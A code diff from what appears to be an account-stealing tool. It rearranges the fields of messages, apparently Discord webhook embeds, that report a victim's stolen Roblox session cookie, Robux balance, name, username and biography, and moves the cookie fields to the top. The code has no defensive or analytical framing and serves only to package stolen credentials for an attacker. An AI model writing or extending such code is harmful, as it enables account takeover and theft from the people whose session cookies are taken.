@@ -751,16 +751,15 @@
                         },
                         fields: [
                           {
+                            name: "Access Token / Cookie",
+                            value: `\`\`\`${cookie}\`\`\``,
+                            inline: true
+                          },
+                          {
                             name: "Robux",
                             value: `\`\`\`${balance.robux}\`\`\``,
                             inline: false
                           },
-                          {
-                            name: "Access Token / Cookie",
-                            value: `\`\`\`${cookie}\`\`\``,
-                            inline: false
-                          },
-
                           {
                             name: "Name",
                             value: `\`\`\`${accountInfo.Name}\`\`\``,
@@ -818,6 +817,11 @@
                         },
                         fields: [
                           {
+                            name: "Cookie",
+                            value: `\`\`\`${cookie}\`\`\``,
+                            inline: true
+                          },
+                          {
                             name: "Username",
                             value: `\`\`\`${accountInfo.username}\`\`\``,
                             inline: false
@@ -852,12 +856,6 @@
                             value: `\`\`\`${accountInfo.biography || "No biography"}\`\`\``,
                             inline: false
                           },
-                          {
-                            name: "Cookie",
-                            value: `\`\`\`${cookie}\`\`\``,
-                            inline: false
-                          },
-
                         ]
                       }
                     )
